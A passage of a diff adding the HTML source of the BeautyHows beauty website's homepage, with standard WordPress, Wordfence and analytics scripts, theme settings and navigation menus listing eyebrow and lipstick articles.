@@ -1,0 +1,1838 @@
+<!doctype html >
+<!--[if IE 8]>    <html class="ie8" lang="en"> <![endif]-->
+<!--[if IE 9]>    <html class="ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html lang="en-US" prefix="og: http://ogp.me/ns#"> <!--<![endif]-->
+<head>
+    
+    <meta charset="UTF-8" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="pingback" href="http://www.beautyhows.com/xmlrpc.php" />
+    
+<!-- This site is optimized with the Yoast SEO plugin v3.3.2 - https://yoast.com/wordpress/plugins/seo/ -->
+<title>Home | BeautyHows</title>
+<meta name="description" content="BeautyHows is beauty and makeup inspiring website with first class content on makeup, beauty and looks. It covers areas such eye and lip makeup, facial care, skin care, hair removal, hair care, wrinkles, manicure, pedicure, among many others."/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="http://www.beautyhows.com/" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Home | BeautyHows" />
+<meta property="og:description" content="BeautyHows is beauty and makeup inspiring website with first class content on makeup, beauty and looks. It covers areas such eye and lip makeup, facial care, skin care, hair removal, hair care, wrinkles, manicure, pedicure, among many others." />
+<meta property="og:url" content="http://www.beautyhows.com/" />
+<meta property="og:site_name" content="BeautyHows" />
+<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/www.beautyhows.com\/","name":"BeautyHows","potentialAction":{"@type":"SearchAction","target":"http:\/\/www.beautyhows.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
+<!-- / Yoast SEO plugin. -->
+
+<link rel="alternate" type="application/rss+xml" title="BeautyHows &raquo; Feed" href="http://www.beautyhows.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="BeautyHows &raquo; Comments Feed" href="http://www.beautyhows.com/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/www.beautyhows.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=fb07fe5fda16be84d20479539d54af0d"}};
+			!function(a,b,c){function d(a){var c,d=b.createElement("canvas"),e=d.getContext&&d.getContext("2d"),f=String.fromCharCode;return e&&e.fillText?(e.textBaseline="top",e.font="600 32px Arial","flag"===a?(e.fillText(f(55356,56806,55356,56826),0,0),d.toDataURL().length>3e3):"diversity"===a?(e.fillText(f(55356,57221),0,0),c=e.getImageData(16,16,1,1).data.toString(),e.fillText(f(55356,57221,55356,57343),0,0),c!==e.getImageData(16,16,1,1).data.toString()):("simple"===a?e.fillText(f(55357,56835),0,0):e.fillText(f(55356,57135),0,0),0!==e.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='toc-screen-css'  href='http://www.beautyhows.com/wp-content/plugins/table-of-contents-plus/screen.min.css?ver=1509' type='text/css' media='all' />
+<link rel='stylesheet' id='google-font-opensans-css'  href='http://fonts.googleapis.com/css?family=Open+Sans%3A300%2C400%2C600%2C700&#038;subset=latin%2Ccyrillic-ext%2Cgreek-ext%2Cgreek%2Cvietnamese%2Clatin-ext%2Ccyrillic&#038;ver=fb07fe5fda16be84d20479539d54af0d' type='text/css' media='all' />
+<link rel='stylesheet' id='google-roboto-cond-css'  href='http://fonts.googleapis.com/css?family=Roboto+Condensed%3A300italic%2C400italic%2C700italic%2C400%2C300%2C700&#038;subset=latin%2Ccyrillic-ext%2Cgreek-ext%2Cgreek%2Cvietnamese%2Clatin-ext%2Ccyrillic&#038;ver=fb07fe5fda16be84d20479539d54af0d' type='text/css' media='all' />
+<link rel='stylesheet' id='google-fonts-style-css'  href='http://fonts.googleapis.com/css?family=Lato%3A400%2C700&#038;ver=fb07fe5fda16be84d20479539d54af0d' type='text/css' media='all' />
+<link rel='stylesheet' id='js_composer_front-css'  href='http://www.beautyhows.com/wp-content/plugins/js_composer/assets/css/js_composer.css?ver=4.4.4' type='text/css' media='all' />
+<link rel='stylesheet' id='td-theme-css'  href='http://www.beautyhows.com/wp-content/themes/Newsmag-tf/Newsmag/style.css?ver=1.7.1' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.beautyhows.com/wp-includes/js/jquery/jquery.js?ver=1.11.3'></script>
+<script type='text/javascript' src='http://www.beautyhows.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<link rel='https://api.w.org/' href='http://www.beautyhows.com/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.beautyhows.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.beautyhows.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='shortlink' href='http://www.beautyhows.com/' />
+<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//www.beautyhows.com/?wordfence_logHuman=1&hid=1465791DAC687B07F3B1682A83A7C8E4');
+</script><script data-cfasync="false" src="//load.sumome.com/" data-sumo-site-id="1789a41043ac43bccf80469d8fb79507212a395fdc7e73938e41bd0e72c3dcb9" async></script><style type="text/css">div#toc_container {background: #ffffff;border: 1px solid #4c4c4c;}div#toc_container ul li {font-size: 90%;}div#toc_container p.toc_title {color: #000000;}div#toc_container p.toc_title a:hover,div#toc_container ul.toc_list a:hover {color: #eb0f97;}div#toc_container p.toc_title a:hover,div#toc_container ul.toc_list a:hover {color: #eb0f97;}</style><!--[if lt IE 9]><script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+    <meta name="generator" content="Powered by Visual Composer - drag and drop page builder for WordPress."/>
+<!--[if IE 8]><link rel="stylesheet" type="text/css" href="http://www.beautyhows.com/wp-content/plugins/js_composer/assets/css/vc-ie8.css" media="screen"><![endif]-->
+<!-- JS generated by theme -->
+
+<script>
+    
+
+var td_blocks = []; //here we store all the items for the current page
+
+//td_block class - each ajax block uses a object of this class for requests
+function td_block() {
+    this.id = '';
+    this.block_type = 1; //block type id (1-234 etc)
+    this.atts = '';
+    this.td_column_number = '';
+    this.td_current_page = 1; //
+    this.post_count = 0; //from wp
+    this.found_posts = 0; //from wp
+    this.max_num_pages = 0; //from wp
+    this.td_filter_value = ''; //current live filter value
+    this.td_filter_ui_uid = ''; //used to select a item from the drop down filter
+    this.is_ajax_running = false;
+    this.td_user_action = ''; // load more or infinite loader (used by the animation)
+    this.header_color = '';
+    this.ajax_pagination_infinite_stop = ''; //show load more at page x
+}
+
+    
+var td_ad_background_click_link="";
+var td_ad_background_click_target="";
+var td_ajax_url="http:\/\/www.beautyhows.com\/wp-admin\/admin-ajax.php?td_theme_name=Newsmag&v=1.7.1";
+var td_get_template_directory_uri="http:\/\/www.beautyhows.com\/wp-content\/themes\/Newsmag-tf\/Newsmag";
+var tds_snap_menu="";
+var tds_logo_on_sticky="";
+var tds_header_style="";
+var td_search_url="http:\/\/www.beautyhows.com\/search\/";
+var td_please_wait="Please wait...";
+var td_email_user_pass_incorrect="User or password incorrect!";
+var td_email_user_incorrect="Email or username incorrect!";
+var td_email_incorrect="Email incorrect!";
+var tds_more_articles_on_post_enable="";
+var tds_more_articles_on_post_time_to_wait="";
+var tds_more_articles_on_post_pages_distance_from_top=0;
+var tds_theme_color_site_wide="#4db2ec";
+var tds_smart_sidebar="";
+var td_magnific_popup_translation_tPrev="Previous (Left arrow key)";
+var td_magnific_popup_translation_tNext="Next (Right arrow key)";
+var td_magnific_popup_translation_tCounter="%curr% of %total%";
+var td_magnific_popup_translation_ajax_tError="The content from %url% could not be loaded.";
+var td_magnific_popup_translation_image_tError="The image #%curr% could not be loaded.";
+</script>
+
+
+<!-- Header style compiled by theme -->
+
+<style>
+    
+.td-post-template-default header .entry-title {
+        font-family:Lato;
+	font-size:28px;
+	line-height:35px;
+	
+    }
+    
+    .td-post-content p,
+    .td-post-content {
+        font-family:Lato;
+	font-size:16px;
+	line-height:22px;
+	
+    }
+    
+    .td-post-content h1 {
+        font-family:Lato;
+	font-size:28px;
+	font-weight:bold;
+	
+    }
+    
+    .td-post-content h2 {
+        font-family:Lato;
+	font-size:24px;
+	line-height:28px;
+	font-weight:bold;
+	
+    }
+    
+    .td-post-content h3 {
+        font-family:Lato;
+	font-size:20px;
+	line-height:24px;
+	font-weight:bold;
+	
+    }
+    
+    .td-post-content h4 {
+        font-family:Lato;
+	font-size:18px;
+	line-height:14px;
+	font-weight:bold;
+	
+    }
+    
+    .td-post-content h5 {
+        font-family:Lato;
+	font-size:17px;
+	font-weight:bold;
+	
+    }
+    
+    .td-post-content h6 {
+        font-family:Lato;
+	font-size:19px;
+	font-weight:bold;
+	
+    }
+</style>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-39234566-1', 'auto');
+  ga('send', 'pageview');
+
+</script><noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+
+</head>
+
+
+<body class="home page page-id-54 page-template page-template-page-pagebuilder-latest page-template-page-pagebuilder-latest-php wpb-js-composer js-comp-ver-4.4.4 vc_responsive td-full-layout lazy-animation" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+
+<div id="td-outer-wrap">
+
+        <div class="td-scroll-up"><i class="td-icon-menu-up"></i></div>
+
+    <div class="td-transition-content-and-menu td-mobile-nav-wrap">
+        <div id="td-mobile-nav">
+    <!-- mobile menu close -->
+    <div class="td-mobile-close">
+        <a href="#">CLOSE</a>
+        <div class="td-nav-triangle"></div>
+    </div>
+
+    <div class="td-mobile-content">
+        <div class="menu-main-menu-container"><ul id="menu-main-menu" class=""><li id="menu-item-7693" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-54 current_page_item menu-item-first menu-item-7693"><a href="http://www.beautyhows.com/">Home</a></li>
+<li id="menu-item-8980" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-8980"><a href="http://www.beautyhows.com/category/eye/">Eye</a>
+<ul class="sub-menu">
+	<li id="menu-item-0" class="menu-item-0"><a href="http://www.beautyhows.com/category/eye/dark-eye-circles/">Dark Eye Circles</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/eye/eye-colors/">Eye Colors</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/eye/eye-makeup/">Eye Makeup</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/eye/eye-makeup/eyeliner/">Eyeliner</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/eye/eye-makeup/eyeshadow/">Eyeshadow</a></li>
+</ul>
+</li>
+<li id="menu-item-8979" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-8979"><a href="http://www.beautyhows.com/category/lip/">Lip</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/lip/lip-makeup/">Lip Makeup</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/lip/lip-makeup/lip-balm/">Lip Balm</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/lip/lip-makeup/lip-gloss/">Lip Gloss</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/lip/lip-makeup/lipsticks/">Lipsticks</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/lip/lip-types/">Lip Types</a></li>
+</ul>
+</li>
+<li id="menu-item-8982" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-8982"><a href="http://www.beautyhows.com/category/hair/">Hair</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/hair/damaged-hair/">Damaged Hair</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/hair/dry-hair/">Dry Hair</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/hair/hair-breakage/">Hair Breakage</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/hair/hair-dyes/">Hair Dyes</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/hair/natural-hair/">Natural Hair</a></li>
+</ul>
+</li>
+<li id="menu-item-8983" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-8983"><a href="http://www.beautyhows.com/category/skin/">Skin</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/skin/dry-skin/">Dry Skin</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/skin/skin-bleaching/">Skin Bleaching</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/skin/skin-lightening/">Skin Lightening</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/skin/skin-peeling/">Skin Peeling</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/skin/skin-tags/">Skin Tags</a></li>
+</ul>
+</li>
+<li id="menu-item-8985" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-8985"><a href="http://www.beautyhows.com/category/body/">Body</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/body/body-odor/">Body Odor</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/body/body-shape/">Body Shape</a></li>
+</ul>
+</li>
+<li id="menu-item-8981" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-8981"><a href="http://www.beautyhows.com/category/foot/">Foot</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/foot/cracked-feet/">Cracked Feet</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/foot/cracked-heels/">Cracked Heels</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/foot/dry-feet/">Dry Feet</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/foot/stinky-feet/">Stinky Feet</a></li>
+</ul>
+</li>
+<li id="menu-item-8984" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-8984"><a href="http://www.beautyhows.com/category/scars/">Scars</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/scars/acne-scars/">Acne Scars</a></li>
+	<li class="menu-item-0"><a href="http://www.beautyhows.com/category/scars/breast-scars/">Breast Scars</a></li>
+</ul>
+</li>
+<li id="menu-item-7694" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-7694"><a href="http://www.beautyhows.com/about-us/">About Us</a>
+<ul class="sub-menu">
+	<li id="menu-item-7695" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7695"><a href="http://www.beautyhows.com/about-us/advertise-with-us/">Advertise with Us</a></li>
+	<li id="menu-item-7696" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7696"><a href="http://www.beautyhows.com/about-us/privacy-policy/">Privacy Policy</a></li>
+	<li id="menu-item-7697" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7697"><a href="http://www.beautyhows.com/about-us/copyright/">Copyright</a></li>
+	<li id="menu-item-7698" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7698"><a href="http://www.beautyhows.com/about-us/disclaimer/">Terms of Use</a></li>
+	<li id="menu-item-7699" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7699"><a href="http://www.beautyhows.com/about-us/contact-us/">Contact Us</a></li>
+</ul>
+</li>
+</ul></div>    </div>
+</div>    </div>
+
+        <div class="td-transition-content-and-menu td-content-wrap">
+
+
+
+<!--
+Header style 1
+-->
+
+<div class="td-header-container td-header-wrap td-header-style-1">
+    <div class="td-header-row td-header-top-menu">
+                    </div>
+
+
+    <div class="td-header-row td-header-header">
+        <div class="td-header-sp-logo">
+                    </div>
+        <div class="td-header-sp-ads">
+            
+<div class="td-header-ad-wrap  td-ad">
+    
+
+</div>        </div>
+    </div>
+    <div class="td-header-menu-wrap">
+        <div class="td-header-row td-header-border td-header-main-menu">
+            <div id="td-header-menu" role="navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+    <div id="td-top-mobile-toggle"><a href="#"><i class="td-icon-font td-icon-mobile"></i></a></div>
+    <div class="td-main-menu-logo">
+            </div>
+    <div class="menu-main-menu-container"><ul id="menu-main-menu-1" class="sf-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-54 current_page_item menu-item-first td-menu-item td-normal-menu menu-item-7693"><a href="http://www.beautyhows.com/">Home</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-8980"><a href="http://www.beautyhows.com/category/eye/">Eye</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><script>var block_td_uid_1_57c835e98d626 = new td_block();
+block_td_uid_1_57c835e98d626.id = "td_uid_1_57c835e98d626";
+block_td_uid_1_57c835e98d626.atts = '{"limit":"5","td_column_number":3,"ajax_pagination":"next_prev","category_id":"82","show_child_cat":5,"td_ajax_filter_type":"td_category_ids_filter","class":"td_block_id_656537942 td_uid_1_57c835e98d626_rand"}';
+block_td_uid_1_57c835e98d626.td_column_number = "3";
+block_td_uid_1_57c835e98d626.block_type = "td_block_mega_menu";
+block_td_uid_1_57c835e98d626.post_count = "5";
+block_td_uid_1_57c835e98d626.found_posts = "157";
+block_td_uid_1_57c835e98d626.max_num_pages = "32";
+block_td_uid_1_57c835e98d626.header_color = "";
+block_td_uid_1_57c835e98d626.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_1_57c835e98d626);
+</script><div class="td_block_wrap td_block_mega_menu td_block_id_656537942 td_uid_1_57c835e98d626_rand  td-pb-border-top"><div id=td_uid_1_57c835e98d626 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/mens-eyebrows-trim-pluck-wax-shape/" rel="bookmark" title="Men’s Eyebrows &#8211; Should You Trim, Pluck, Wax or Shape Them?"><img width="180" height="129" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/10/Should-Men-Groom-Eyebrows.jpg" alt="Should Men Groom Eyebrows" title="Men’s Eyebrows &#8211; Should You Trim, Pluck, Wax or Shape Them?"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/mens-eyebrows-trim-pluck-wax-shape/" rel="bookmark" title="Men’s Eyebrows &#8211; Should You Trim, Pluck, Wax or Shape Them?">Men’s Eyebrows &#8211; Should You Trim, Pluck, Wax or Shape Them?</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/megan-fox-eyebrows-get-tutorial-pictures/" rel="bookmark" title="Megan Fox eyebrows – How to Get, Tutorial, before and After Pictures"><img width="137" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/10/Megan-Fox-Eyebrows.jpg" alt="Megan Fox Eyebrows" title="Megan Fox eyebrows – How to Get, Tutorial, before and After Pictures"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/megan-fox-eyebrows-get-tutorial-pictures/" rel="bookmark" title="Megan Fox eyebrows – How to Get, Tutorial, before and After Pictures">Megan Fox eyebrows – How to Get, Tutorial, before and After Pictures</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/best-eyebrow-kit-efl-anastasia-milani-benefits-dying-shaping-waxing-and-tinting-brow-kits/" rel="bookmark" title="Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani, EFL or Which One?"><img width="142" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/09/Anastasia-Beverly-Hills-Bold-Beautiful-Kit.jpg" alt="Anastasia Beverly Hills Bold &amp; Beautiful Kit" title="Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani, EFL or Which One?"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/best-eyebrow-kit-efl-anastasia-milani-benefits-dying-shaping-waxing-and-tinting-brow-kits/" rel="bookmark" title="Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani, EFL or Which One?">Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani, EFL or Which One?</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/demi-lovato-eyebrows-how-to-get-or-do-them-tutorial-x-demi-lovatos-brows/" rel="bookmark" title="How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?"><img width="96" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/09/how-to-get-demi-lovato-eyebrows.jpg" alt="how to get demi lovato eyebrows" title="How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/demi-lovato-eyebrows-how-to-get-or-do-them-tutorial-x-demi-lovatos-brows/" rel="bookmark" title="How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?">How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/bad-eyebrows-how-to-fix-bad-tattooed-celebrities-pictures-photos/" rel="bookmark" title="How to Fix Bad Eyebrows  with Pictures"><img width="97" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/09/Lourdes-Leon-Madonnas-Daughter-once-seen-with-a-unibrow.jpg" alt="Lourdes Leon - Madonna&#039;s Daughter once seen with a unibrow" title="How to Fix Bad Eyebrows  with Pictures"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/bad-eyebrows-how-to-fix-bad-tattooed-celebrities-pictures-photos/" rel="bookmark" title="How to Fix Bad Eyebrows  with Pictures">How to Fix Bad Eyebrows  with Pictures</a></h3>            </div>
+        </div>
+        </div></div></div><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_1_57c835e98d626" id="td_uid_2_57c835e992029" data-td_block_id="td_uid_1_57c835e98d626" data-td_filter_value="" href="http://www.beautyhows.com/category/eye/">All</a><a class="mega-menu-sub-cat-td_uid_1_57c835e98d626"  id="td_uid_3_57c835e992184" data-td_block_id="td_uid_1_57c835e98d626" data-td_filter_value="22" href="http://www.beautyhows.com/category/eye/dark-eye-circles/">Dark Eye Circles</a><a class="mega-menu-sub-cat-td_uid_1_57c835e98d626"  id="td_uid_4_57c835e9922cc" data-td_block_id="td_uid_1_57c835e98d626" data-td_filter_value="24" href="http://www.beautyhows.com/category/eye/eye-colors/">Eye Colors</a><a class="mega-menu-sub-cat-td_uid_1_57c835e98d626"  id="td_uid_5_57c835e99241e" data-td_block_id="td_uid_1_57c835e98d626" data-td_filter_value="83" href="http://www.beautyhows.com/category/eye/eye-makeup/">Eye Makeup</a><a class="mega-menu-sub-cat-td_uid_1_57c835e98d626"  id="td_uid_6_57c835e9925e3" data-td_block_id="td_uid_1_57c835e98d626" data-td_filter_value="16" href="http://www.beautyhows.com/category/eye/eye-makeup/eyeliner/">Eyeliner</a><a class="mega-menu-sub-cat-td_uid_1_57c835e98d626"  id="td_uid_7_57c835e992773" data-td_block_id="td_uid_1_57c835e98d626" data-td_filter_value="18" href="http://www.beautyhows.com/category/eye/eye-makeup/eyeshadow/">Eyeshadow</a></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_1_57c835e98d626" data-td_block_id="td_uid_1_57c835e98d626"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_1_57c835e98d626" data-td_block_id="td_uid_1_57c835e98d626"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> <!-- ./block1 --></div></div></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-8979"><a href="http://www.beautyhows.com/category/lip/">Lip</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><script>var block_td_uid_8_57c835e9965f1 = new td_block();
+block_td_uid_8_57c835e9965f1.id = "td_uid_8_57c835e9965f1";
+block_td_uid_8_57c835e9965f1.atts = '{"limit":"5","td_column_number":3,"ajax_pagination":"next_prev","category_id":"84","show_child_cat":5,"td_ajax_filter_type":"td_category_ids_filter","class":"td_block_id_1465315248 td_uid_8_57c835e9965f1_rand"}';
+block_td_uid_8_57c835e9965f1.td_column_number = "3";
+block_td_uid_8_57c835e9965f1.block_type = "td_block_mega_menu";
+block_td_uid_8_57c835e9965f1.post_count = "5";
+block_td_uid_8_57c835e9965f1.found_posts = "27";
+block_td_uid_8_57c835e9965f1.max_num_pages = "6";
+block_td_uid_8_57c835e9965f1.header_color = "";
+block_td_uid_8_57c835e9965f1.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_8_57c835e9965f1);
+</script><div class="td_block_wrap td_block_mega_menu td_block_id_1465315248 td_uid_8_57c835e9965f1_rand  td-pb-border-top"><div id=td_uid_8_57c835e9965f1 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/lead-in-lipstick-lead-free-lipstick-brands-containing-without-list-of-lipsticks-with-lead/" rel="bookmark" title="Do Lipsticks Contain Lead? Here Are Some Without"><img width="180" height="122" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/07/Lead-in-Lipsticks-Do-Lipsticks-contain-Lead-Which-Brands-contain-and-which-brands-are-lead-free.jpg" alt="Lead in Lipsticks - Do Lipsticks contain Lead, Which Brands contain and which brands are lead free" title="Do Lipsticks Contain Lead? Here Are Some Without"/></a></div>                            </div>
+
+            <div class="item-details">
